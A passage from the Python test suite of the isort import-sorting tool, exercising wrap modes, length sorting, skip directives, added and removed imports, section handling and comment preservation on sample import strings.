                                             multi_line_output=WrapModes.HANGING_INDENT,
                                             line_length=40, indent=""    "").output
    assert test_output_hanging_indent == (""from third_party import lib1, lib2, \\\n""
                                          ""    lib3, lib4, lib5, lib6, lib7, \\\n""
                                          ""    lib8, lib9, lib10, lib11, lib12, \\\n""
                                          ""    lib13, lib14, lib15, lib16, lib17, \\\n""
                                          ""    lib18, lib20, lib21, lib22\n"")

    comment_output_hanging_indent = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                                multi_line_output=WrapModes.HANGING_INDENT,
                                                line_length=40, indent=""    "").output
    assert comment_output_hanging_indent == (""from third_party import lib1, \\  # comment\n""
                                             ""    lib2, lib3, lib4, lib5, lib6, \\\n""
                                             ""    lib7, lib8, lib9, lib10, lib11, \\\n""
                                             ""    lib12, lib13, lib14, lib15, lib16, \\\n""
                                             ""    lib17, lib18, lib20, lib21, lib22\n"")

    test_output_vertical_indent = SortImports(file_contents=REALLY_LONG_IMPORT,
                                              multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                                              line_length=40, indent=""    "").output
    assert test_output_vertical_indent == (""from third_party import (\n""
                                           ""    lib1,\n""
                                           ""    lib2,\n""
                                           ""    lib3,\n""
                                           ""    lib4,\n""
                                           ""    lib5,\n""
                                           ""    lib6,\n""
                                           ""    lib7,\n""
                                           ""    lib8,\n""
                                           ""    lib9,\n""
                                           ""    lib10,\n""
                                           ""    lib11,\n""
                                           ""    lib12,\n""
                                           ""    lib13,\n""
                                           ""    lib14,\n""
                                           ""    lib15,\n""
                                           ""    lib16,\n""
                                           ""    lib17,\n""
                                           ""    lib18,\n""
                                           ""    lib20,\n""
                                           ""    lib21,\n""
                                           ""    lib22\n""
                                           "")\n"")

    comment_output_vertical_indent = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                                 multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                                                 line_length=40, indent=""    "").output
    assert comment_output_vertical_indent == (""from third_party import (  # comment\n""
                                              ""    lib1,\n""
                                              ""    lib2,\n""
                                              ""    lib3,\n""
                                              ""    lib4,\n""
                                              ""    lib5,\n""
                                              ""    lib6,\n""
                                              ""    lib7,\n""
                                              ""    lib8,\n""
                                              ""    lib9,\n""
                                              ""    lib10,\n""
                                              ""    lib11,\n""
                                              ""    lib12,\n""
                                              ""    lib13,\n""
                                              ""    lib14,\n""
                                              ""    lib15,\n""
                                              ""    lib16,\n""
                                              ""    lib17,\n""
                                              ""    lib18,\n""
                                              ""    lib20,\n""
                                              ""    lib21,\n""
                                              ""    lib22\n""
                                              "")\n"")

    test_output_vertical_grid = SortImports(file_contents=REALLY_LONG_IMPORT,
                                            multi_line_output=WrapModes.VERTICAL_GRID,
                                            line_length=40, indent=""    "").output
    assert test_output_vertical_grid == (""from third_party import (\n""
                                         ""    lib1, lib2, lib3, lib4, lib5, lib6,\n""
                                         ""    lib7, lib8, lib9, lib10, lib11,\n""
                                         ""    lib12, lib13, lib14, lib15, lib16,\n""
                                         ""    lib17, lib18, lib20, lib21, lib22)\n"")

    comment_output_vertical_grid = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                               multi_line_output=WrapModes.VERTICAL_GRID,
                                               line_length=40, indent=""    "").output
    assert comment_output_vertical_grid == (""from third_party import (  # comment\n""
                                            ""    lib1, lib2, lib3, lib4, lib5, lib6,\n""
                                            ""    lib7, lib8, lib9, lib10, lib11,\n""
                                            ""    lib12, lib13, lib14, lib15, lib16,\n""
                                            ""    lib17, lib18, lib20, lib21, lib22)\n"")

    test_output_vertical_grid_grouped = SortImports(file_contents=REALLY_LONG_IMPORT,
                                                    multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
                                                    line_length=40, indent=""    "").output
    assert test_output_vertical_grid_grouped == (""from third_party import (\n""
                                                 ""    lib1, lib2, lib3, lib4, lib5, lib6,\n""
                                                 ""    lib7, lib8, lib9, lib10, lib11,\n""
                                                 ""    lib12, lib13, lib14, lib15, lib16,\n""
                                                 ""    lib17, lib18, lib20, lib21, lib22\n""
                                                 "")\n"")

    comment_output_vertical_grid_grouped = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                                       multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
                                                       line_length=40, indent=""    "").output
    assert comment_output_vertical_grid_grouped == (""from third_party import (  # comment\n""
                                                    ""    lib1, lib2, lib3, lib4, lib5, lib6,\n""
                                                    ""    lib7, lib8, lib9, lib10, lib11,\n""
                                                    ""    lib12, lib13, lib14, lib15, lib16,\n""
                                                    ""    lib17, lib18, lib20, lib21, lib22\n""
                                                    "")\n"")

    output_noqa = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                              multi_line_output=WrapModes.NOQA).output
    assert output_noqa == (""from third_party import lib1, lib2, lib3, lib4, lib5, lib6, lib7, lib8, lib9, lib10, lib11,""
                           "" lib12, lib13, lib14, lib15, lib16, lib17, lib18, lib20, lib21, lib22  ""
                           ""# NOQA comment\n"")

    test_case = SortImports(file_contents=SINGLE_LINE_LONG_IMPORT,
                            multi_line_output=WrapModes.VERTICAL_GRID_GROUPED_NO_COMMA,
                            line_length=40, indent='    ').output
    test_output_vertical_grid_grouped_doesnt_wrap_early = test_case
    assert test_output_vertical_grid_grouped_doesnt_wrap_early == (""from third_party import (\n""
                                                                   ""    lib1, lib2, lib3, lib4, lib5, lib5ab\n""
                                                                   "")\n"")


def test_qa_comment_case():
    test_input = ""from veryveryveryveryveryveryveryveryveryveryvery import X  # NOQA""
    test_output = SortImports(file_contents=test_input, line_length=40, multi_line_output=WrapModes.NOQA).output
    assert test_output == ""from veryveryveryveryveryveryveryveryveryveryvery import X  # NOQA\n""

    test_input = ""import veryveryveryveryveryveryveryveryveryveryvery  # NOQA""
    test_output = SortImports(file_contents=test_input, line_length=40, multi_line_output=WrapModes.NOQA).output
    assert test_output == ""import veryveryveryveryveryveryveryveryveryveryvery  # NOQA\n""


def test_length_sort():
    """"""Test setting isort to sort on length instead of alphabetically.""""""
    test_input = (""import medium_sizeeeeeeeeeeeeee\n""
                  ""import shortie\n""
                  ""import looooooooooooooooooooooooooooooooooooooong\n""
                  ""import medium_sizeeeeeeeeeeeeea\n"")
    test_output = SortImports(file_contents=test_input, length_sort=True).output
    assert test_output == (""import shortie\n""
                           ""import medium_sizeeeeeeeeeeeeea\n""
                           ""import medium_sizeeeeeeeeeeeeee\n""
                           ""import looooooooooooooooooooooooooooooooooooooong\n"")


def test_length_sort_section():
    """"""Test setting isort to sort on length instead of alphabetically for a specific section.""""""
    test_input = (""import medium_sizeeeeeeeeeeeeee\n""
                  ""import shortie\n""
                  ""import sys\n""
                  ""import os\n""
                  ""import looooooooooooooooooooooooooooooooooooooong\n""
                  ""import medium_sizeeeeeeeeeeeeea\n"")
    test_output = SortImports(file_contents=test_input, length_sort_stdlib=True).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""import looooooooooooooooooooooooooooooooooooooong\n""
                           ""import medium_sizeeeeeeeeeeeeea\n""
                           ""import medium_sizeeeeeeeeeeeeee\n""
                           ""import shortie\n"")


def test_convert_hanging():
    """"""Ensure that isort will convert hanging indents to correct indent
    method.""""""
    test_input = (""from third_party import lib1, lib2, \\\n""
                  ""    lib3, lib4, lib5, lib6, lib7, \\\n""
                  ""    lib8, lib9, lib10, lib11, lib12, \\\n""
                  ""    lib13, lib14, lib15, lib16, lib17, \\\n""
                  ""    lib18, lib20, lib21, lib22\n"")
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.GRID,
                              line_length=40).output
    assert test_output == (""from third_party import (lib1, lib2,\n""
                           ""                         lib3, lib4,\n""
                           ""                         lib5, lib6,\n""
                           ""                         lib7, lib8,\n""
                           ""                         lib9, lib10,\n""
                           ""                         lib11, lib12,\n""
                           ""                         lib13, lib14,\n""
                           ""                         lib15, lib16,\n""
                           ""                         lib17, lib18,\n""
                           ""                         lib20, lib21,\n""
                           ""                         lib22)\n"")


def test_custom_indent():
    """"""Ensure setting a custom indent will work as expected.""""""
    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,
                              line_length=40, indent=""   "", balanced_wrapping=False).output
    assert test_output == (""from third_party import lib1, lib2, \\\n""
                           ""   lib3, lib4, lib5, lib6, lib7, lib8, \\\n""
                           ""   lib9, lib10, lib11, lib12, lib13, \\\n""
                           ""   lib14, lib15, lib16, lib17, lib18, \\\n""
                           ""   lib20, lib21, lib22\n"")

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,
                              line_length=40, indent=""'  '"", balanced_wrapping=False).output
    assert test_output == (""from third_party import lib1, lib2, \\\n""
                           ""  lib3, lib4, lib5, lib6, lib7, lib8, \\\n""
                           ""  lib9, lib10, lib11, lib12, lib13, \\\n""
                           ""  lib14, lib15, lib16, lib17, lib18, \\\n""
                           ""  lib20, lib21, lib22\n"")

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,
                              line_length=40, indent=""tab"", balanced_wrapping=False).output
    assert test_output == (""from third_party import lib1, lib2, \\\n""
                           ""\tlib3, lib4, lib5, lib6, lib7, lib8, \\\n""
                           ""\tlib9, lib10, lib11, lib12, lib13, \\\n""
                           ""\tlib14, lib15, lib16, lib17, lib18, \\\n""
                           ""\tlib20, lib21, lib22\n"")

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,
                              line_length=40, indent=2, balanced_wrapping=False).output
    assert test_output == (""from third_party import lib1, lib2, \\\n""
                           ""  lib3, lib4, lib5, lib6, lib7, lib8, \\\n""
                           ""  lib9, lib10, lib11, lib12, lib13, \\\n""
                           ""  lib14, lib15, lib16, lib17, lib18, \\\n""
                           ""  lib20, lib21, lib22\n"")


def test_use_parentheses():
    test_input = (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import ""
        ""    my_custom_function as my_special_function""
    )
    test_output = SortImports(
        file_contents=test_input, line_length=79, use_parentheses=True
    ).output

    assert test_output == (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\n""
        ""    my_custom_function as my_special_function)\n""
    )

    test_output = SortImports(
        file_contents=test_input, line_length=79, use_parentheses=True,
        include_trailing_comma=True,
    ).output

    assert test_output == (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\n""
        ""    my_custom_function as my_special_function,)\n""
    )

    test_output = SortImports(
        file_contents=test_input, line_length=79, use_parentheses=True,
        multi_line_output=WrapModes.VERTICAL_HANGING_INDENT
    ).output

    assert test_output == (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\n""
        ""    my_custom_function as my_special_function\n)\n""
    )

    test_output = SortImports(
        file_contents=test_input, line_length=79, use_parentheses=True,
        multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
        include_trailing_comma=True
    ).output

    assert test_output == (
        ""from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\n""
        ""    my_custom_function as my_special_function,\n)\n""
    )


def test_skip():
    """"""Ensure skipping a single import will work as expected.""""""
    test_input = (""import myproject\n""
                  ""import django\n""
                  ""print('hey')\n""
                  ""import sys  # isort:skip this import needs to be placed here\n\n\n\n\n\n\n"")

    test_output = SortImports(file_contents=test_input, known_third_party=['django']).output
    assert test_output == (""import django\n""
                           ""\n""
                           ""import myproject\n""
                           ""\n""
                           ""print('hey')\n""
                           ""import sys  # isort:skip this import needs to be placed here\n"")


def test_skip_with_file_name():
    """"""Ensure skipping a file works even when file_contents is provided.""""""
    test_input = (""import django\n""
                  ""import myproject\n"")

    sort_imports = SortImports(file_path='/baz.py', file_contents=test_input, settings_path=os.getcwd(),
                               skip=['baz.py'])
    assert sort_imports.skipped
    assert sort_imports.output is None


def test_skip_within_file():
    """"""Ensure skipping a whole file works.""""""
    test_input = (""# isort:skip_file\n""
                  ""import django\n""
                  ""import myproject\n"")
    sort_imports = SortImports(file_contents=test_input, known_third_party=['django'])
    assert sort_imports.skipped
    assert sort_imports.output is None


def test_force_to_top():
    """"""Ensure forcing a single import to the top of its category works as expected.""""""
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1\n"")
    test_output = SortImports(file_contents=test_input, force_to_top=['lib5']).output
    assert test_output == (""import lib5\n""
                           ""import lib1\n""
                           ""import lib2\n""
                           ""import lib6\n"")


def test_add_imports():
    """"""Ensures adding imports works as expected.""""""
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1\n\n"")
    test_output = SortImports(file_contents=test_input, add_imports=['import lib4', 'import lib7']).output
    assert test_output == (""import lib1\n""
                           ""import lib2\n""
                           ""import lib4\n""
                           ""import lib5\n""
                           ""import lib6\n""
                           ""import lib7\n"")

    # Using simplified syntax
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1\n\n"")
    test_output = SortImports(file_contents=test_input, add_imports=['lib4', 'lib7', 'lib8.a']).output
    assert test_output == (""import lib1\n""
                           ""import lib2\n""
                           ""import lib4\n""
                           ""import lib5\n""
                           ""import lib6\n""
                           ""import lib7\n""
                           ""from lib8 import a\n"")

    # On a file that has no pre-existing imports
    test_input = ('""""""Module docstring""""""\n'
                  '\n'
                  'class MyClass(object):\n'
                  '    pass\n')
    test_output = SortImports(file_contents=test_input, add_imports=['from __future__ import print_function']).output
    assert test_output == ('""""""Module docstring""""""\n'
                           'from __future__ import print_function\n'
                           '\n'
                           '\n'
                           'class MyClass(object):\n'
                           '    pass\n')

    # On a file that has no pre-existing imports, and no doc-string
    test_input = ('class MyClass(object):\n'
                  '    pass\n')
    test_output = SortImports(file_contents=test_input, add_imports=['from __future__ import print_function']).output
    assert test_output == ('from __future__ import print_function\n'
                           '\n'
                           '\n'
                           'class MyClass(object):\n'
                           '    pass\n')

    # On a file with no content what so ever
    test_input = ("""")
    test_output = SortImports(file_contents=test_input, add_imports=['lib4']).output
    assert test_output == ("""")

    # On a file with no content what so ever, after force_adds is set to True
    test_input = ("""")
    test_output = SortImports(file_contents=test_input, add_imports=['lib4'], force_adds=True).output
    assert test_output == (""import lib4\n"")


def test_remove_imports():
    """"""Ensures removing imports works as expected.""""""
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1"")
    test_output = SortImports(file_contents=test_input, remove_imports=['lib2', 'lib6']).output
    assert test_output == (""import lib1\n""
                           ""import lib5\n"")

    # Using natural syntax
    test_input = (""import lib6\n""
                  ""import lib2\n""
                  ""import lib5\n""
                  ""import lib1\n""
                  ""from lib8 import a"")
    test_output = SortImports(file_contents=test_input, remove_imports=['import lib2', 'import lib6',
                                                                        'from lib8 import a']).output
    assert test_output == (""import lib1\n""
                           ""import lib5\n"")


def test_explicitly_local_import():
    """"""Ensure that explicitly local imports are separated.""""""
    test_input = (""import lib1\n""
                  ""import lib2\n""
                  ""import .lib6\n""
                  ""from . import lib7"")
    assert SortImports(file_contents=test_input).output == (""import lib1\n""
                                                            ""import lib2\n""
                                                            ""\n""
                                                            ""import .lib6\n""
                                                            ""from . import lib7\n"")


def test_quotes_in_file():
    """"""Ensure imports within triple quotes don't get imported.""""""
    test_input = ('import os\n'
                  '\n'
                  '""""""\n'
                  'Let us\n'
                  'import foo\n'
                  'okay?\n'
                  '""""""\n')
    assert SortImports(file_contents=test_input).output == test_input

    test_input = ('import os\n'
                  '\n'
                  ""'\""\""\""'\n""
                  'import foo\n')
    assert SortImports(file_contents=test_input).output == ('import os\n'
                                                            '\n'
                                                            'import foo\n'
                                                            '\n'
                                                            ""'\""\""\""'\n"")

    test_input = ('import os\n'
                  '\n'
                  '""""""Let us""""""\n'
                  'import foo\n'
                  '""""""okay?""""""\n')
    assert SortImports(file_contents=test_input).output == ('import os\n'
                                                            '\n'
                                                            'import foo\n'
                                                            '\n'
                                                            '""""""Let us""""""\n'
                                                            '""""""okay?""""""\n')

    test_input = ('import os\n'
                  '\n'
                  '#""""""\n'
                  'import foo\n'
                  '#""""""')
    assert SortImports(file_contents=test_input).output == ('import os\n'
                                                            '\n'
                                                            'import foo\n'
                                                            '\n'
                                                            '#""""""\n'
                                                            '#""""""\n')

    test_input = ('import os\n'
                  '\n'
                  ""'\\\n""
                  ""import foo'\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = ('import os\n'
                  '\n'
                  ""'''\n""
                  ""\\'''\n""
                  'import junk\n'
                  ""'''\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_check_newline_in_imports(capsys):
    """"""Ensure tests works correctly when new lines are in imports.""""""
    test_input = ('from lib1 import (\n'
                  '    sub1,\n'
                  '    sub2,\n'
                  '    sub3\n)\n')

    SortImports(file_contents=test_input, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT, line_length=20,
                check=True, verbose=True)
    out, err = capsys.readouterr()
    assert 'SUCCESS' in out


def test_forced_separate():
    """"""Ensure that forcing certain sub modules to show separately works as expected.""""""
    test_input = ('import sys\n'
                  'import warnings\n'
                  'from collections import OrderedDict\n'
                  '\n'
                  'from django.core.exceptions import ImproperlyConfigured, SuspiciousOperation\n'
                  'from django.core.paginator import InvalidPage\n'
                  'from django.core.urlresolvers import reverse\n'
                  'from django.db import models\n'
                  'from django.db.models.fields import FieldDoesNotExist\n'
                  'from django.utils import six\n'
                  'from django.utils.deprecation import RenameMethodsBase\n'
                  'from django.utils.encoding import force_str, force_text\n'
                  'from django.utils.http import urlencode\n'
                  'from django.utils.translation import ugettext, ugettext_lazy\n'
                  '\n'
                  'from django.contrib.admin import FieldListFilter\n'
                  'from django.contrib.admin.exceptions import DisallowedModelAdminLookup\n'
                  'from django.contrib.admin.options import IncorrectLookupParameters, IS_POPUP_VAR, TO_FIELD_VAR\n')
    assert SortImports(file_contents=test_input, forced_separate=['django.contrib'],
                       known_third_party=['django'], line_length=120, order_by_type=False).output == test_input

    test_input = ('from .foo import bar\n'
                  '\n'
                  'from .y import ca\n')
    assert SortImports(file_contents=test_input, forced_separate=['.y'],
                       line_length=120, order_by_type=False).output == test_input


def test_default_section():
    """"""Test to ensure changing the default section works as expected.""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import myproject.test\n""
                  ""import django.settings"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django'],
                              default_section=""FIRSTPARTY"").output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""import django.settings\n""
                           ""\n""
                           ""import myproject.test\n"")

    test_output_custom = SortImports(file_contents=test_input, known_third_party=['django'],
                                     default_section=""STDLIB"").output
    assert test_output_custom == (""import myproject.test\n""
                                  ""import os\n""
                                  ""import sys\n""
                                  ""\n""
                                  ""import django.settings\n"")


def test_first_party_overrides_standard_section():
    """"""Test to ensure changing the default section works as expected.""""""
    test_input = (""from HTMLParser import HTMLParseError, HTMLParser\n""
                  ""import sys\n""
                  ""import os\n""
                  ""import this\n""
                  ""import profile.test\n"")
    test_output = SortImports(file_contents=test_input, known_first_party=['profile']).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""import this\n""
                           ""from HTMLParser import HTMLParseError, HTMLParser\n""
                           ""\n""
                           ""import profile.test\n"")


def test_thirdy_party_overrides_standard_section():
    """"""Test to ensure changing the default section works as expected.""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import this\n""
                  ""import profile.test\n"")
    test_output = SortImports(file_contents=test_input, known_third_party=['profile']).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""import this\n""
                           ""\n""
                           ""import profile.test\n"")


def test_known_pattern_path_expansion():
    """"""Test to ensure patterns ending with path sep gets expanded and nested packages treated as known patterns""""""
    test_input = (""from kate_plugin import isort_plugin\n""
                  ""import sys\n""
                  ""import isort.settings\n""
                  ""import this\n""
                  ""import os\n"")
    test_output = SortImports(
        file_contents=test_input,
        default_section='THIRDPARTY',
        known_first_party=['./', 'this', 'kate_plugin']
    ).output
    assert test_output == (""import os\n""
                            ""import sys\n""
                            ""\n""
                            ""import isort.settings\n""
                            ""import this\n""
                            ""from kate_plugin import isort_plugin\n"")


def test_force_single_line_imports():
    """"""Test to ensure forcing imports to each have their own line works as expected.""""""
    test_input = (""from third_party import lib1, lib2, \\\n""
                  ""    lib3, lib4, lib5, lib6, lib7, \\\n""
                  ""    lib8, lib9, lib10, lib11, lib12, \\\n""
                  ""    lib13, lib14, lib15, lib16, lib17, \\\n""
                  ""    lib18, lib20, lib21, lib22\n"")
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.GRID,
                              line_length=40, force_single_line=True).output
    assert test_output == (""from third_party import lib1\n""
                           ""from third_party import lib2\n""
                           ""from third_party import lib3\n""
                           ""from third_party import lib4\n""
                           ""from third_party import lib5\n""
                           ""from third_party import lib6\n""
                           ""from third_party import lib7\n""
                           ""from third_party import lib8\n""
                           ""from third_party import lib9\n""
                           ""from third_party import lib10\n""
                           ""from third_party import lib11\n""
                           ""from third_party import lib12\n""
                           ""from third_party import lib13\n""
                           ""from third_party import lib14\n""
                           ""from third_party import lib15\n""
                           ""from third_party import lib16\n""
                           ""from third_party import lib17\n""
                           ""from third_party import lib18\n""
                           ""from third_party import lib20\n""
                           ""from third_party import lib21\n""
                           ""from third_party import lib22\n"")


def test_force_single_line_long_imports():
    test_input = (""from veryveryveryveryveryvery import small, big\n"")
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.NOQA,
                              line_length=40, force_single_line=True).output
    assert test_output == (""from veryveryveryveryveryvery import big\n""
                           ""from veryveryveryveryveryvery import small  # NOQA\n"")


def test_titled_imports():
    """"""Tests setting custom titled/commented import sections.""""""
    test_input = (""import sys\n""
                  ""import unicodedata\n""
                  ""import statistics\n""
                  ""import os\n""
                  ""import myproject.test\n""
                  ""import django.settings"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django'],
                              import_heading_stdlib=""Standard Library"", import_heading_firstparty=""My Stuff"").output
    assert test_output == (""# Standard Library\n""
                           ""import os\n""
                           ""import statistics\n""
                           ""import sys\n""
                           ""import unicodedata\n""
                           ""\n""
                           ""import django.settings\n""
                           ""\n""
                           ""# My Stuff\n""
                           ""import myproject.test\n"")
    test_second_run = SortImports(file_contents=test_output, known_third_party=['django'],
                                  import_heading_stdlib=""Standard Library"", import_heading_firstparty=""My Stuff"").output
    assert test_second_run == test_output


def test_balanced_wrapping():
    """"""Tests balanced wrapping mode, where the length of individual lines maintain width.""""""
    test_input = (""from __future__ import (absolute_import, division, print_function,\n""
                  ""                        unicode_literals)"")
    test_output = SortImports(file_contents=test_input, line_length=70, balanced_wrapping=True).output
    assert test_output == (""from __future__ import (absolute_import, division,\n""
                           ""                        print_function, unicode_literals)\n"")


def test_relative_import_with_space():
    """"""Tests the case where the relation and the module that is being imported from is separated with a space.""""""
    test_input = (""from ... fields.sproqet import SproqetCollection"")
    assert SortImports(file_contents=test_input).output == (""from ...fields.sproqet import SproqetCollection\n"")
    test_input = (""from .import foo"")
    test_output = (""from . import foo\n"")
    assert SortImports(file_contents=test_input).output == test_output
    test_input = (""from.import foo"")
    test_output = (""from . import foo\n"")
    assert SortImports(file_contents=test_input).output == test_output


def test_multiline_import():
    """"""Test the case where import spawns multiple lines with inconsistent indentation.""""""
    test_input = (""from pkg \\\n""
                  ""    import stuff, other_suff \\\n""
                  ""               more_stuff"")
    assert SortImports(file_contents=test_input).output == (""from pkg import more_stuff, other_suff, stuff\n"")

    # test again with a custom configuration
    custom_configuration = {'force_single_line': True,
                            'line_length': 120,
                            'known_first_party': ['asdf', 'qwer'],
                            'default_section': 'THIRDPARTY',
                            'forced_separate': 'asdf'}  # type: Dict[str, Any]
    expected_output = (""from pkg import more_stuff\n""
                       ""from pkg import other_suff\n""
                       ""from pkg import stuff\n"")
    assert SortImports(file_contents=test_input, **custom_configuration).output == expected_output


def test_single_multiline():
    """"""Test the case where a single import spawns multiple lines.""""""
    test_input = (""from os import\\\n""
                  ""        getuid\n""
                  ""\n""
                  ""print getuid()\n"")
    output = SortImports(file_contents=test_input).output
    assert output == (
        ""from os import getuid\n""
        ""\n""
        ""print getuid()\n""
    )


def test_atomic_mode():
    # without syntax error, everything works OK
    test_input = (""from b import d, c\n""
                  ""from a import f, e\n"")
    assert SortImports(file_contents=test_input, atomic=True).output == (""from a import e, f\n""
                                                                          ""from b import c, d\n"")

    # with syntax error content is not changed
    test_input += ""while True print 'Hello world'""  # blatant syntax error
    assert SortImports(file_contents=test_input, atomic=True).output == test_input


def test_order_by_type():
    test_input = ""from module import Class, CONSTANT, function""
    assert SortImports(file_contents=test_input,
                       order_by_type=True).output == (""from module import CONSTANT, Class, function\n"")

    # More complex sample data
    test_input = ""from module import Class, CONSTANT, function, BASIC, Apple""
    assert SortImports(file_contents=test_input,
                       order_by_type=True).output == (""from module import BASIC, CONSTANT, Apple, Class, function\n"")

    # Really complex sample data, to verify we don't mess with top level imports, only nested ones
    test_input = (""import StringIO\n""
                  ""import glob\n""
                  ""import os\n""
                  ""import shutil\n""
                  ""import tempfile\n""
                  ""import time\n""
                  ""from subprocess import PIPE, Popen, STDOUT\n"")

    assert SortImports(file_contents=test_input, order_by_type=True).output == \
                (""import glob\n""
                 ""import os\n""
                 ""import shutil\n""
                 ""import StringIO\n""
                 ""import tempfile\n""
                 ""import time\n""
                 ""from subprocess import PIPE, STDOUT, Popen\n"")


def test_custom_lines_after_import_section():
    """"""Test the case where the number of lines to output after imports has been explicitly set.""""""
    test_input = (""from a import b\n""
                  ""foo = 'bar'\n"")

    # default case is one space if not method or class after imports
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""foo = 'bar'\n"")

    # test again with a custom number of lines after the import section
    assert SortImports(file_contents=test_input, lines_after_imports=2).output == (""from a import b\n""
                                                                                   ""\n""
                                                                                   ""\n""
                                                                                   ""foo = 'bar'\n"")


def test_smart_lines_after_import_section():
    """"""Tests the default 'smart' behavior for dealing with lines after the import section""""""
    # one space if not method or class after imports
    test_input = (""from a import b\n""
                  ""foo = 'bar'\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""foo = 'bar'\n"")

    # two spaces if a method or class after imports
    test_input = (""from a import b\n""
                  ""def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""\n""
                                                            ""def my_function():\n""
                                                            ""    pass\n"")

    # two spaces if an async method after imports
    test_input = (""from a import b\n""
                  ""async def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""\n""
                                                            ""async def my_function():\n""
                                                            ""    pass\n"")

    # two spaces if a method or class after imports - even if comment before function
    test_input = (""from a import b\n""
                  ""# comment should be ignored\n""
                  ""def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""\n""
                                                            ""# comment should be ignored\n""
                                                            ""def my_function():\n""
                                                            ""    pass\n"")

    # ensure logic works with both style comments
    test_input = (""from a import b\n""
                  '""""""\n'
                  ""    comment should be ignored\n""
                  '""""""\n'
                  ""def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            ""\n""
                                                            '""""""\n'
                                                            ""    comment should be ignored\n""
                                                            '""""""\n'
                                                            ""def my_function():\n""
                                                            ""    pass\n"")

    # Ensure logic doesn't incorrectly skip over assignments to multi-line strings
    test_input = (""from a import b\n""
                  'X = """"""test\n'
                  '""""""\n'
                  ""def my_function():\n""
                  ""    pass\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b\n""
                                                            ""\n""
                                                            'X = """"""test\n'
                                                            '""""""\n'
                                                            ""def my_function():\n""
                                                            ""    pass\n"")


def test_settings_combine_instead_of_overwrite():
    """"""Test to ensure settings combine logically, instead of fully overwriting.""""""
    assert set(SortImports(known_standard_library=['not_std_library']).config['known_standard_library']) == \
           set(SortImports().config['known_standard_library'] + ['not_std_library'])

    assert set(SortImports(not_known_standard_library=['thread']).config['known_standard_library']) == \
           {item for item in SortImports().config['known_standard_library'] if item != 'thread'}


def test_combined_from_and_as_imports():
    """"""Test to ensure it's possible to combine from and as imports.""""""
    test_input = (""from translate.misc.multistring import multistring\n""
                  ""from translate.storage import base, factory\n""
                  ""from translate.storage.placeables import general, parse as rich_parse\n"")
    assert SortImports(file_contents=test_input, combine_as_imports=True).output == test_input
    test_input = (""import os \nimport os as _os"")
    test_output = (""import os\nimport os as _os\n"")
    assert SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output == test_output


def test_as_imports_with_line_length():
    """"""Test to ensure it's possible to combine from and as imports.""""""
    test_input = (""from translate.storage import base as storage_base\n""
                  ""from translate.storage.placeables import general, parse as rich_parse\n"")
    assert SortImports(file_contents=test_input, combine_as_imports=False, line_length=40).output == \
                  (""from translate.storage import \\\n    base as storage_base\n""
                   ""from translate.storage.placeables import \\\n    general\n""
                   ""from translate.storage.placeables import \\\n    parse as rich_parse\n"")


def test_keep_comments():
    """"""Test to ensure isort properly keeps comments in tact after sorting.""""""
    # Straight Import
    test_input = (""import foo  # bar\n"")
    assert SortImports(file_contents=test_input).output == test_input

    # Star import
    test_input_star = (""from foo import *  # bar\n"")
    assert SortImports(file_contents=test_input_star).output == test_input_star

    # Force Single Line From Import
    test_input = (""from foo import bar  # comment\n"")
    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input

    # From import
